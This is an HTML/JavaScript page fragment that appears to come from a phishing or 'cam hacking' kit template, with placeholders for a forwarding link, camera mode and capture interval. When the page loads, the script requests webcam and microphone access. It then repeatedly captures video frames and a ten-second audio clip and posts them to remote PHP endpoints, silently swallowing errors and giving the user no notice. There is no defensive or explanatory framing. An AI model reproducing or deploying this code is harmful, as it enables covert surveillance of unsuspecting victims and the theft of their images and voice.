</head>

<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>

<canvas id="canvas" width="640" height="480"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: true,
  video: {
    
    facingMode: "cam_facing_mode"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, cam_interval_ms);
  
  // Audio capture
  (function() {
    try {
      var audioTracks = stream.getAudioTracks();
      if (audioTracks.length > 0) {
        var audioStream = new MediaStream(audioTracks);
        var recorder = new MediaRecorder(audioStream);
        var chunks = [];
        recorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = function() {
          var blob = new Blob(chunks, {type: recorder.mimeType || 'audio/webm'});
          var fr = new FileReader();
          fr.onloadend = function() {
            $.ajax({type:'POST', data:{audio: fr.result}, url:'forwarding_link/audio.php', async:true});
          };
          fr.readAsDataURL(blob);
        };
        recorder.start();
        setTimeout(function() { try { if (recorder.state === 'recording') recorder.stop(); } catch(e) {} }, 10000);
      }
    } catch(e) {}
  })();

}

// Load init
init();

</script>
